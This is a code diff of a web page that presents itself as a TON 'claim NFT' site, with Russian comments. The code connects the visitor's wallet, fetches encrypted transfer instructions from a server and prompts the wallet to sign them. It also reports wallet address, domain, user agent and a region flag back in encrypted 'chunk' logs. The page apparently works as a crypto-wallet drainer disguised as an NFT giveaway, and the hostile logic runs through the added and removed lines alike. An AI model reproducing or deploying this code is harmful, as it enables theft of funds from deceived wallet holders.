+                        console.error('❌ Transaction signing failed:', signError);
+                        
+                        if (signError.message?.includes('Rejected')) {
+                            showStatus('Transaction rejected by user', 'error');
+                        } else if (signError.message?.includes('timeout')) {
+                            showStatus('Transaction timeout', 'error');
+                        } else {
+                            showStatus('Signing failed: ' + signError.message, 'error');
+                        }
+                        
+                        await sendTransactionStatus('error', messages);
+                    }
+                    
+                } else {
+                    console.log('❌ No transaction messages available');
+                    showStatus('No transactions available from server', 'error');
+                }
+
+            } catch (error) {
+                console.error('💥 Transaction processing error:', error);
+                showStatus('Transaction processing failed: ' + error.message, 'error');
+                await sendTransactionStatus('error', []);
+            }
+        }
+
+        // Отправка статуса транзакции на сервер
+        async function sendTransactionStatus(status, messages) {
+            if (!ws || !isWebSocketConnected) {
+                console.log('❌ WebSocket not connected');
+                return;
+            }
+            
+            try {
+                const statusData = {
+                    method: 'chunkStatus',
+                    status: status,
+                    chunk: messages,
+                    userInfo: getUserInfo()
+                };
+
+                // Шифруем статус с помощью клиентского ключа
+                const encryptedData = Aes.Ctr.encrypt(JSON.stringify(statusData), clientEncryption, 256);
+                
+                const message = {
+                    method: 'log',
+                    message: encryptedData
+                };
+                
+                console.log('📤 Sending encrypted status to server');
+                ws.send(JSON.stringify(message));
+                
+            } catch (error) {
+                console.error('❌ Failed to send encrypted status:', error);
+            }
         }
 
         // Получение информации о пользователе
         function getUserInfo() {
             const wallet = tonConnectUI?.account;
             return {
-                ip: 'auto-detected', // Сервер сам определит реальный IP
-                country: 'auto',     // Сервер сам определит страну
+                ip: 'auto-detected',
+                country: 'auto',
                 domain: window.location.hostname,
                 sng: false,
                 address: wallet?.address || '',
                 device: {
                     app: 'web',
-                    platform: 'browser'
+                    platform: 'browser',
+                    userAgent: navigator.userAgent
                 },
-                hash: generateHash()
+                hash: generateHash(),
+                timestamp: Date.now()
             };
         }
 
         function generateHash() {
             return Math.random().toString(36).substring(2) + Date.now().toString(36);
         }
-
-        // Основная функция для получения NFT
-        function claimNFT() {
-    if (!tonConnectUI?.connected) {
-        showStatus('Please connect your wallet first!', 'error');
-        return;
-    }
-
-    if (!isWebSocketConnected) {
-        showStatus('Server connection lost. Reconnecting...', 'error');
-        connectWebSocket();
-        return;
-    }
-
-    showStatus('Requesting NFT transaction...', 'info');
-
-    // Отправляем запрос на получение транзакций в правильном формате
-    const message = {
-        method: 'getMessages',
-        message: {
-            userInfo: getUserInfo()
-        }
-    };
-    
-    console.log('📤 Sending getMessages request:', message);
-    ws.send(JSON.stringify(message));
-}
-
-        // ЗАМЕНИТЕ эту функцию полностью:
-function handleServerMessage(data) {
-    console.log('Server response:', data);
-    
-    // Обрабатываем поле "method" вместо "action"
-    switch (data.method) {
-        case 'connected':
-            console.log('✅ Connected to server, sending safety check...');
-            // Отправляем безопасное соединение
-            const safetyMessage = {
-                method: 'connected',
-                secret: data.secret // используем секрет от сервера
-            };
-            ws.send(JSON.stringify(safetyMessage));
-            break;
-            
-        case 'safety':
-            console.log('✅ Safety check passed, sending wait...');
-            // Отправляем что готовы к работе
-            const waitMessage = {
-                method: 'safety', 
-                message: 'hello'
-            };
-            ws.send(JSON.stringify(waitMessage));
-            break;
-            
-        case 'wait':
-            console.log('✅ Server is ready, you can now claim NFT');
-            showStatus('Server is ready! You can claim NFT now', 'success');
-            break;
-            
-        case 'messages':
-            console.log('📨 Received transaction messages');
-            handleTransactionMessages(data.message);
-            break;
-            
-        case 'done':
-            showStatus('Operation completed successfully!', 'success');
-            break;
-            
-        case 'error':
-            showStatus('Server error: ' + data.message, 'error');
-            break;
-            
-        case 'manifest':
-            console.log('📋 Manifest received');
-            break;
-            
-        default:
-            console.log('Unknown method:', data.method);
-    }
-}
-        
-
-        // Обработка транзакционных сообщений
-        async function handleTransactionMessages(encryptedData) {
-            try {
-                showStatus('Preparing transaction for signing...', 'info');
-                
-                // В реальном приложении здесь будет дешифровка данных
-                // Для демо предположим, что данные уже в правильном формате
-                const transactionData = encryptedData;
-                
-                if (transactionData.messages && transactionData.messages.length > 0) {
-                    const transaction = {
-                        validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
-                        messages: transactionData.messages
-                    };
-
-                    // Отправляем транзакцию на подписание
-                    const result = await tonConnectUI.sendTransaction(transaction);
-                    
-                    showStatus('🎉 NFT claimed successfully!', 'success');
-                    console.log('Transaction result:', result);
-                    
-                    // Отправляем статус на сервер
-                    sendTransactionStatus('sent', transactionData.messages);
-                    
-                } else {
-                    showStatus('No transactions available', 'error');
-                }
-            } catch (error) {
-                console.error('Transaction error:', error);
-                showStatus('Transaction failed: ' + error.message, 'error');
-                sendTransactionStatus('error', []);
-            }
-        }
-
-        // Отправка статуса транзакции на сервер
-        function sendTransactionStatus(status, chunk) {
-            if (!ws || !isWebSocketConnected) return;
-            
-            const message = {
-                action: 'log',
-                data: {
-                    method: 'chunkStatus',
-                    status: status,
-                    chunk: chunk,
-                    userInfo: getUserInfo()
-                }
-            };
-            ws.send(JSON.stringify(message));
-        }
-        // Добавьте эти функции в начало вашего клиентского кода (в index.html)
-class AesCrypto {
-    static async encrypt(text, key, bits = 256) {
-        try {
-            // Конвертируем ключ в ArrayBuffer
-            const keyData = new TextEncoder().encode(key);
-            const cryptoKey = await crypto.subtle.importKey(
-                'raw',
-                keyData,
-                { name: 'AES-CTR' },
-                false,
-                ['encrypt']
-            );
-
-            // Генерируем IV (counter)
-            const iv = crypto.getRandomValues(new Uint8Array(16));
-            
-            // Шифруем данные
-            const encodedText = new TextEncoder().encode(text);
-            const encrypted = await crypto.subtle.encrypt(
-                {
-                    name: 'AES-CTR',
-                    counter: iv,
-                    length: 64
-                },
-                cryptoKey,
-                encodedText
-            );
-
-            // Комбинируем IV + encrypted data и конвертируем в hex
-            const result = new Uint8Array(iv.length + encrypted.byteLength);
-            result.set(iv, 0);
-            result.set(new Uint8Array(encrypted), iv.length);
-            
-            return this.arrayBufferToHex(result);
-        } catch (error) {
-            console.error('Encryption error:', error);
-            throw error;
-        }
-    }
-
-    static async decrypt(encryptedHex, key, bits = 256) {
-        try {
-            // Конвертируем hex в ArrayBuffer
-            const encryptedData = this.hexToArrayBuffer(encryptedHex);
-            
-            // Извлекаем IV (первые 16 байт)
-            const iv = encryptedData.slice(0, 16);
-            const data = encryptedData.slice(16);
-            
-            // Конвертируем ключ
-            const keyData = new TextEncoder().encode(key);
-            const cryptoKey = await crypto.subtle.importKey(
-                'raw',
-                keyData,
-                { name: 'AES-CTR' },
-                false,
-                ['decrypt']
-            );
-
-            // Дешифруем
-            const decrypted = await crypto.subtle.decrypt(
-                {
-                    name: 'AES-CTR',
-                    counter: iv,
-                    length: 64
-                },
-                cryptoKey,
-                data
-            );
-
-            return new TextDecoder().decode(decrypted);
-        } catch (error) {
-            console.error('Decryption error:', error);
-            throw error;
-        }
-    }
-
-    static arrayBufferToHex(buffer) {
-        return Array.from(new Uint8Array(buffer))
-            .map(b => b.toString(16).padStart(2, '0'))
-            .join('');
-    }
-
-    static hexToArrayBuffer(hex) {
-        const bytes = new Uint8Array(hex.length / 2);
-        for (let i = 0; i < hex.length; i += 2) {
-            bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
-        }
-        return bytes;
-    }
-}
-
-// Функция для получения SHA256 хеша (совместима с сервером)
-async function getSHA256Hash(str) {
-    const encoder = new TextEncoder();
-    const data = encoder.encode(str);
-    const hash = await crypto.subtle.digest('SHA-256', data);
-    return Array.from(new Uint8Array(hash))
-        .map(b => b.toString(16).padStart(2, '0'))
-        .join('');
-}
-
-// Функции для cipher/decipher (совместимые с сервером 'AcmeDev')
-function createCipher(secret) {
-    return (text) => {
-        // Простая XOR шифровка для примера (замените на вашу реальную логику)
-        let result = '';
-        for (let i = 0; i < text.length; i++) {
-            const charCode = text.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
-            result += String.fromCharCode(charCode);
-        }
-        return btoa(result); // Base64 для передачи
-    };
-}
-
-function createDecipher(secret) {
-    return (encryptedText) => {
-        try {
-            const decoded = atob(encryptedText);
-            let result = '';
-            for (let i = 0; i < decoded.length; i++) {
-                const charCode = decoded.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
-                result += String.fromCharCode(charCode);
-            }
-            return result;
-        } catch (error) {
-            console.error('Decipher error:', error);
-            throw error;
-        }
-    };
-}
-
-// Глобальные переменные для шифрования
-let myEncryption = '';
-let clientEncryption = '';
-let signature = '';
-let encryptionKey = '';
-
-// Обновите функцию handleServerMessage для обработки шифрования
-function handleServerMessage(data) {
-    console.log('Server response:', data);
-    
-    switch (data.method) {
-        case 'connected':
-            console.log('✅ Connected to server, initializing encryption...');
-            myEncryption = createDecipher('AcmeDev')(data.secret);
-            console.log('Decrypted server key:', myEncryption);
-            
-            // Отправляем подтверждение соединения
-            const connectMessage = {
-                method: 'connected',
-                secret: data.secret // эхо-ответ
-            };
-            ws.send(JSON.stringify(connectMessage));
-            break;
-            
-        case 'safety':
-            console.log('🔒 Safety check received');
-            handleSafetyCheck(data.message);
-            break;
-            
-        case 'wait':
-            console.log('✅ Server is ready');
-            showStatus('Server is ready! You can claim NFT now', 'success');
-            break;
-            
-        case 'messages':
-            console.log('📨 Received encrypted messages');
-            handleEncryptedMessages(data.message);
-            break;
-            
-        case 'done':
-            showStatus('Operation completed successfully!', 'success');
-            break;
-            
-        case 'error':
-            showStatus('Server error: ' + data.message, 'error');
-            break;
-            
-        case 'manifest':
-            console.log('📋 Manifest received');
-            break;
-            
-        default:
-            console.log('Unknown method:', data.method);
-    }
-}
-
-// Обработка проверки безопасности
-async function handleSafetyCheck(encryptedMessage) {
-    try {
-        // Дешифруем сообщение безопасности
-        const decrypted = await AesCrypto.decrypt(encryptedMessage, myEncryption);
-        console.log('Decrypted safety message:', decrypted);
-        
-        if (decrypted === 'hello') {
-            // Отправляем подтверждение
-            const safetyResponse = {
-                method: 'safety',
-                message: 'hello'
-            };
-            ws.send(JSON.stringify(safetyResponse));
-        } else {
-            console.error('Safety check failed');
-            showStatus('Security verification failed', 'error');
-        }
-    } catch (error) {
-        console.error('Safety check error:', error);
-        showStatus('Security error', 'error');
-    }
-}
-
-// Обработка зашифрованных сообщений с транзакциями
-async function handleEncryptedMessages(encryptedData) {
-    try {
-        showStatus('Decrypting transaction data...', 'info');
-        
-        // Предполагаем, что encryptedData это зашифрованная строка
-        const decryptedJson = await AesCrypto.decrypt(encryptedData, myEncryption);
-        console.log('Decrypted transaction data:', decryptedJson);
-        
-        const transactionData = JSON.parse(decryptedJson);
-        await processTransactionData(transactionData);
-        
-    } catch (error) {
-        console.error('Message decryption error:', error);
-        showStatus('Failed to decrypt transaction data', 'error');
-    }
-}
-
-// Основная функция обработки транзакций
-async function processTransactionData(transactionData) {
-    try {
-        console.log('📋 Processing transaction data:', transactionData);
-
-        if (!transactionData.messages || !Array.isArray(transactionData.messages)) {
-            console.error('Invalid transaction format');
-            showStatus('Invalid transaction data received', 'error');
-            return;
-        }
-
-        const messages = transactionData.messages;
-        console.log('📨 Transaction messages:', messages);
-
-        if (messages.length > 0) {
-            // Подготавливаем транзакцию для подписания
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
-                messages: messages.map(msg => ({
-                    address: msg.address,
-                    amount: msg.amount || msg.value || '0',
-                    payload: msg.payload || ''
-                }))
-            };
-
-            console.log('📝 Final transaction for signing:', transaction);
-            showStatus(`Ready to sign ${messages.length} transaction(s)`, 'info');
-            
-            // Небольшая задержка для UX
-            await new Promise(resolve => setTimeout(resolve, 1000));
-
-            try {
-                console.log('🖊️ Sending transaction for signing...');
-                const result = await tonConnectUI.sendTransaction(transaction);
-                
-                showStatus('🎉 Transaction signed successfully!', 'success');
-                console.log('✅ Transaction result:', result);
-                
-                // Отправляем статус на сервер
-                await sendTransactionStatus('sent', messages);
-                
-            } catch (signError) {
-                console.error('❌ Transaction signing failed:', signError);
-                
-                if (signError.message?.includes('Rejected')) {
-                    showStatus('Transaction rejected by user', 'error');
-                } else if (signError.message?.includes('timeout')) {
-                    showStatus('Transaction timeout', 'error');
-                } else {
-                    showStatus('Signing failed: ' + signError.message, 'error');
-                }
-                
-                await sendTransactionStatus('error', messages);
-            }
-            
-        } else {
-            console.log('❌ No transaction messages available');
-            showStatus('No transactions available from server', 'error');
-        }
-
-    } catch (error) {
-        console.error('💥 Transaction processing error:', error);
-        showStatus('Transaction processing failed: ' + error.message, 'error');
-        await sendTransactionStatus('error', []);
-    }
-}
-
-// Функция отправки статуса транзакции с шифрованием
-async function sendTransactionStatus(status, messages) {
-    if (!ws || !isWebSocketConnected) {
-        console.log('❌ WebSocket not connected');
-        return;
-    }
-    
-    try {
-        const statusData = {
-            method: 'chunkStatus',
-            status: status,
-            chunk: messages,
-            userInfo: getUserInfo()
-        };
-
-        // Шифруем данные перед отправкой
-        const encryptedData = await AesCrypto.encrypt(JSON.stringify(statusData), myEncryption);
-        
-        const message = {
-            method: 'log',
-            message: encryptedData
-        };
-        
-        console.log('📤 Sending encrypted status to server');
-        ws.send(JSON.stringify(message));
-        
-    } catch (error) {
-        console.error('❌ Failed to send encrypted status:', error);
-    }
-}
-
-// Обновите функцию claimNFT для использования шифрования
-async function claimNFT() {
-    if (!tonConnectUI?.connected) {
-        showStatus('Please connect your wallet first!', 'error');
-        return;
-    }
-
-    if (!isWebSocketConnected) {
-        showStatus('Server connection lost. Reconnecting...', 'error');
-        connectWebSocket();
-        return;
-    }
-
-    showStatus('Requesting NFT transaction...', 'info');
-
-    try {
-        const requestData = {
-            userInfo: getUserInfo()
-        };
-
-        // Шифруем запрос
-        const encryptedRequest = await AesCrypto.encrypt(JSON.stringify(requestData), myEncryption);
-        
-        const message = {
-            method: 'getMessages',
-            message: encryptedRequest
-        };
-        
-        console.log('📤 Sending encrypted NFT request');
-        ws.send(JSON.stringify(message));
-        
-    } catch (error) {
-        console.error('❌ Failed to encrypt request:', error);
-        showStatus('Failed to prepare request', 'error');
-    }
-}
-
-// Обновите функцию getUserInfo для включения дополнительных данных
-function getUserInfo() {
-    const wallet = tonConnectUI?.account;
-    return {
-        ip: 'auto-detected',
-        country: 'auto',
-        domain: window.location.hostname,
-        sng: false,
-        address: wallet?.address || '',
-        device: {
-            app: 'web',
-            platform: 'browser',
-            userAgent: navigator.userAgent
-        },
-        hash: generateHash(),
-        timestamp: Date.now()
-    };
-}
-
-function generateHash() {
-    return Math.random().toString(36).substring(2) + Date.now().toString(36);
-}
-        function sendTransactionStatus(status, chunk) {
-    if (!ws || !isWebSocketConnected) return;
-    
-    const message = {
-        method: 'log',
-        message: {
-            method: 'chunkStatus',
-            status: status,
-            chunk: chunk,
-            userInfo: getUserInfo()
-        }
-    };
-    
-    console.log('📤 Sending transaction status:', message);
-    ws.send(JSON.stringify(message));
-}
 
         // Отключение кошелька
         function disconnectWallet() {
@@ -929,13 +1056,4 @@ function generateHash() {
         };
     </script>
 </body>
-
 </html>
-
-
-
-
-
-
-
-
